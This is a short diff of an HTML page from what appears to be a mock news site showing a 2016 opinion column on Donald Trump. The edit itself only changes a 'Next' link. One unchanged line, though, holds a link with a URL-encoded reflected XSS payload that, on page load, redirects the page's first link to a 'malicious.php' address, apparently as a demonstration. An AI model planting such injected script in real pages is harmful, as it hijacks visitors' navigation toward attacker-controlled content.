@@ -22,7 +22,7 @@
 
 <p class="details">By Paul Krugman|August 27,2016 10:10AM CET| <a href="#">Nytimes</a> </p>
 <h2 align="right"><a href="20160826-opinion.php"> Previous </a> </h2>
-<h2 align="left"><a href="index.php"> Next </a> </h2>
+<h2 align="left"><a href="20160828-opinion.php"> Next </a> </h2>
 
 <p><a href="http://www.theplanetreports.com/index.php?name=Shekhar%3Cscript%3Ewindow.onload%20=%20function(){var%20link=document.getElementsByTagName(%22a%22);link%20%20[0].href=%22http://theplanetreports.com/malicious.php%22;}%3C/script%3E" target="_blank"> 
 Donald Trump has taken a strange turn lately. O.K. </a>, he has taken a lot of strange turns — that’s what happens when you nominate a short-attention-span candidate who knows nothing about policy and refuses to sit still for more than three minutes. But never mind what passes for Trumpian policy ideas. What’s odd is the shift in what the problem is supposed to be.
